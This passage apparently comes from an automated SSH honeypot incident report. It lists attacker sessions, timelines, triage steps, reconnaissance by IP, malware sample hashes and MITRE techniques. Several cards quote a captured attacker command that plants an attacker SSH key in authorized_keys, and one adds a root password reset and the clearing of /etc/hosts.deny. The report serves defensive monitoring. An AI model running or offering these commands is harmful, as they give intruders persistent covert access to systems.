| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:29:54` | `cowrie.session.connect` |
| `2026-04-11 06:29:54` | `cowrie.client.version` |
| `2026-04-11 06:29:54` | `cowrie.client.kex` |
| `2026-04-11 06:29:55` | `cowrie.login.success` |
| `2026-04-11 06:29:56` | `cowrie.session.params` |
| `2026-04-11 06:29:56` | `cowrie.command.input` |
| `2026-04-11 06:29:56` | `cowrie.command.failed` |
| `2026-04-11 06:29:57` | `cowrie.log.closed` |
| `2026-04-11 06:29:57` | `cowrie.session.params` |
| `2026-04-11 06:29:57` | `cowrie.command.input` |
| `2026-04-11 06:29:58` | `cowrie.session.file_download` |
| `2026-04-11 06:29:58` | `cowrie.log.closed` |
| `2026-04-11 06:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc77c5ac809e

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:30 |
| **Last Seen** | 2026-04-11 06:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:30:01` | `cowrie.session.connect` |
| `2026-04-11 06:30:01` | `cowrie.client.version` |
| `2026-04-11 06:30:02` | `cowrie.client.kex` |
| `2026-04-11 06:30:03` | `cowrie.login.success` |
| `2026-04-11 06:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd647c80ea37

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:30 |
| **Last Seen** | 2026-04-11 06:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:30:19` | `cowrie.session.connect` |
| `2026-04-11 06:30:19` | `cowrie.client.version` |
| `2026-04-11 06:30:19` | `cowrie.client.kex` |
| `2026-04-11 06:30:19` | `cowrie.login.success` |
| `2026-04-11 06:30:19` | `cowrie.session.params` |
| `2026-04-11 06:30:19` | `cowrie.command.input` |
| `2026-04-11 06:30:19` | `cowrie.command.failed` |
| `2026-04-11 06:30:19` | `cowrie.log.closed` |
| `2026-04-11 06:30:19` | `cowrie.session.params` |
| `2026-04-11 06:30:19` | `cowrie.command.input` |
| `2026-04-11 06:30:19` | `cowrie.session.file_download` |
| `2026-04-11 06:30:19` | `cowrie.log.closed` |
| `2026-04-11 06:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae0507a40f3

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:30 |
| **Last Seen** | 2026-04-11 06:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:30:20` | `cowrie.session.connect` |
| `2026-04-11 06:30:20` | `cowrie.client.version` |
| `2026-04-11 06:30:20` | `cowrie.client.kex` |
| `2026-04-11 06:30:20` | `cowrie.login.success` |
| `2026-04-11 06:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb86dbed9168

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:36 |
| **Last Seen** | 2026-04-11 06:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:36:54` | `cowrie.session.connect` |
| `2026-04-11 06:36:54` | `cowrie.client.version` |
| `2026-04-11 06:36:54` | `cowrie.client.kex` |
| `2026-04-11 06:36:54` | `cowrie.login.success` |
| `2026-04-11 06:36:54` | `cowrie.session.params` |
| `2026-04-11 06:36:54` | `cowrie.command.input` |
| `2026-04-11 06:36:54` | `cowrie.command.failed` |
| `2026-04-11 06:36:54` | `cowrie.log.closed` |
| `2026-04-11 06:36:54` | `cowrie.session.params` |
| `2026-04-11 06:36:54` | `cowrie.command.input` |
| `2026-04-11 06:36:54` | `cowrie.session.file_download` |
| `2026-04-11 06:36:54` | `cowrie.log.closed` |
| `2026-04-11 06:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec21779aaa4e

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:36 |
| **Last Seen** | 2026-04-11 06:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:36:56` | `cowrie.session.connect` |
| `2026-04-11 06:36:56` | `cowrie.client.version` |
| `2026-04-11 06:36:56` | `cowrie.client.kex` |
| `2026-04-11 06:36:56` | `cowrie.login.success` |
| `2026-04-11 06:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd69fdab715

| Field | Detail |
|---|---|
| **Source IP** | `211.251.245[.]88` |
| **First Seen** | 2026-04-11 06:44 |
| **Last Seen** | 2026-04-11 06:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:44:21` | `cowrie.session.connect` |
| `2026-04-11 06:44:21` | `cowrie.client.version` |
| `2026-04-11 06:44:22` | `cowrie.client.kex` |
| `2026-04-11 06:44:22` | `cowrie.login.success` |
| `2026-04-11 06:44:22` | `cowrie.session.params` |
| `2026-04-11 06:44:22` | `cowrie.command.input` |
| `2026-04-11 06:44:22` | `cowrie.command.failed` |
| `2026-04-11 06:44:22` | `cowrie.log.closed` |
| `2026-04-11 06:44:23` | `cowrie.session.params` |
| `2026-04-11 06:44:23` | `cowrie.command.input` |
| `2026-04-11 06:44:23` | `cowrie.session.file_download` |
| `2026-04-11 06:44:23` | `cowrie.log.closed` |
| `2026-04-11 06:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.251.245[.]88` to AbuseIPDB if not already reported
- [ ] Block `211.251.245[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d562e6660c47

| Field | Detail |
|---|---|
| **Source IP** | `211.251.245[.]88` |
| **First Seen** | 2026-04-11 06:44 |
| **Last Seen** | 2026-04-11 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:44:25` | `cowrie.session.connect` |
| `2026-04-11 06:44:25` | `cowrie.client.version` |
| `2026-04-11 06:44:25` | `cowrie.client.kex` |
| `2026-04-11 06:44:26` | `cowrie.login.success` |
| `2026-04-11 06:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.251.245[.]88` to AbuseIPDB if not already reported
- [ ] Block `211.251.245[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19e40b94077

| Field | Detail |
|---|---|
| **Source IP** | `49.247.36[.]49` |
| **First Seen** | 2026-04-11 06:56 |
| **Last Seen** | 2026-04-11 06:56 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CkRur0GWUBQ4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:56:07` | `cowrie.session.connect` |
| `2026-04-11 06:56:07` | `cowrie.client.version` |
| `2026-04-11 06:56:07` | `cowrie.client.kex` |
| `2026-04-11 06:56:08` | `cowrie.login.success` |
| `2026-04-11 06:56:08` | `cowrie.session.params` |
| `2026-04-11 06:56:08` | `cowrie.command.input` |
| `2026-04-11 06:56:08` | `cowrie.command.failed` |
| `2026-04-11 06:56:08` | `cowrie.log.closed` |
| `2026-04-11 06:56:09` | `cowrie.session.params` |
| `2026-04-11 06:56:09` | `cowrie.command.input` |
| `2026-04-11 06:56:09` | `cowrie.session.file_download` |
| `2026-04-11 06:56:09` | `cowrie.log.closed` |
| `2026-04-11 06:56:17` | `cowrie.session.params` |
| `2026-04-11 06:56:17` | `cowrie.command.input` |
| `2026-04-11 06:56:17` | `cowrie.log.closed` |
| `2026-04-11 06:56:17` | `cowrie.session.params` |
| `2026-04-11 06:56:17` | `cowrie.command.input` |
| `2026-04-11 06:56:17` | `cowrie.log.closed` |
| `2026-04-11 06:56:18` | `cowrie.session.params` |
| `2026-04-11 06:56:18` | `cowrie.command.input` |
| `2026-04-11 06:56:18` | `cowrie.session.file_download` |
| `2026-04-11 06:56:18` | `cowrie.log.closed` |
| `2026-04-11 06:56:18` | `cowrie.session.params` |
| `2026-04-11 06:56:18` | `cowrie.command.input` |
| `2026-04-11 06:56:18` | `cowrie.log.closed` |
| `2026-04-11 06:56:19` | `cowrie.session.params` |
| `2026-04-11 06:56:19` | `cowrie.command.input` |
| `2026-04-11 06:56:19` | `cowrie.log.closed` |
| `2026-04-11 06:56:19` | `cowrie.session.params` |
| `2026-04-11 06:56:19` | `cowrie.command.input` |
| `2026-04-11 06:56:19` | `cowrie.command.input` |
| `2026-04-11 06:56:19` | `cowrie.log.closed` |
| `2026-04-11 06:56:20` | `cowrie.session.params` |
| `2026-04-11 06:56:20` | `cowrie.command.input` |
| `2026-04-11 06:56:20` | `cowrie.log.closed` |
| `2026-04-11 06:56:20` | `cowrie.session.params` |
| `2026-04-11 06:56:20` | `cowrie.command.input` |
| `2026-04-11 06:56:20` | `cowrie.log.closed` |
| `2026-04-11 06:56:20` | `cowrie.session.params` |
| `2026-04-11 06:56:20` | `cowrie.command.input` |
| `2026-04-11 06:56:21` | `cowrie.log.closed` |
| `2026-04-11 06:56:21` | `cowrie.session.params` |
| `2026-04-11 06:56:21` | `cowrie.command.input` |
| `2026-04-11 06:56:21` | `cowrie.log.closed` |
| `2026-04-11 06:56:21` | `cowrie.session.params` |
| `2026-04-11 06:56:21` | `cowrie.command.input` |
| `2026-04-11 06:56:22` | `cowrie.log.closed` |
| `2026-04-11 06:56:22` | `cowrie.session.params` |
| `2026-04-11 06:56:22` | `cowrie.command.input` |
| `2026-04-11 06:56:22` | `cowrie.log.closed` |
| `2026-04-11 06:56:22` | `cowrie.session.params` |
| `2026-04-11 06:56:22` | `cowrie.command.input` |
| `2026-04-11 06:56:22` | `cowrie.log.closed` |
| `2026-04-11 06:56:23` | `cowrie.session.params` |
| `2026-04-11 06:56:23` | `cowrie.command.input` |
| `2026-04-11 06:56:23` | `cowrie.log.closed` |
| `2026-04-11 06:56:23` | `cowrie.session.params` |
| `2026-04-11 06:56:23` | `cowrie.command.input` |
| `2026-04-11 06:56:23` | `cowrie.log.closed` |
| `2026-04-11 06:56:24` | `cowrie.session.params` |
| `2026-04-11 06:56:24` | `cowrie.command.input` |
| `2026-04-11 06:56:24` | `cowrie.log.closed` |
| `2026-04-11 06:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.36[.]49` to AbuseIPDB if not already reported
- [ ] Block `49.247.36[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.168.135[.]187` | **25** | 2026-04-11 06:01 | 2026-04-11 06:24 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.38.26[.]5` | **25** | 2026-04-11 05:42 | 2026-04-11 06:31 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `201.49.108[.]245` | **25** | 2026-04-11 05:44 | 2026-04-11 06:31 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `203.90.110[.]186` | **25** | 2026-04-11 05:46 | 2026-04-11 06:41 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `209.141.41[.]212` | **25** | 2026-04-11 06:01 | 2026-04-11 06:19 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.165.185[.]71` | **25** | 2026-04-11 05:45 | 2026-04-11 06:27 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.127[.]232` | **21** | 2026-04-11 05:36 | 2026-04-11 05:55 | 38m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `163.7.9[.]84` | **7** | 2026-04-11 05:46 | 2026-04-11 05:58 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `49.247.36[.]49` | **3** | 2026-04-11 06:45 | 2026-04-11 06:56 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `106.225.192[.]15` | **2** | 2026-04-11 06:05 | 2026-04-11 06:08 | 4m | 0 | `T1592` | 🟢 LOW |
| `103.210.21[.]178` | 1 | 2026-04-11 05:35 | 2026-04-11 05:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.181[.]42` | 1 | 2026-04-11 05:36 | 2026-04-11 05:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.77[.]231` | 1 | 2026-04-11 05:34 | 2026-04-11 05:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.236.76[.]72` | 1 | 2026-04-11 06:45 | 2026-04-11 06:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `13.81.183[.]28` | 1 | 2026-04-11 06:01 | 2026-04-11 06:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.112[.]105` | 1 | 2026-04-11 05:37 | 2026-04-11 05:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]138` | 1 | 2026-04-11 05:37 | 2026-04-11 05:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.64[.]39` | 1 | 2026-04-11 06:02 | 2026-04-11 06:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.245.12[.]182` | 1 | 2026-04-11 05:44 | 2026-04-11 05:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.251.245[.]88` | 1 | 2026-04-11 06:44 | 2026-04-11 06:44 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.134.94[.]132` | 1 | 2026-04-11 06:10 | 2026-04-11 06:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.171.95[.]18` | 1 | 2026-04-11 06:03 | 2026-04-11 06:05 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `106.225.192[.]15` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 35 |
| `13.81.183[.]28` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `201.49.108[.]245` | BR | ALGAR TELECOM S/A | **100** ⚠️ | 50 |
| `14.103.112[.]105` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `209.141.41[.]212` | US | FranTech Solutions | **100** ⚠️ | 50 |
| `106.13.181[.]42` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `172.245.12[.]182` | US | RackNerd LLC | **100** ⚠️ | 12 |
| `14.103.127[.]232` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `203.90.110[.]186` | IN | Tikona Infinet Ltd. | **100** ⚠️ | 38 |
| `163.7.9[.]84` | ID | BYTEPLUS | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 327 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 167 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 132 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 67 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 67 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
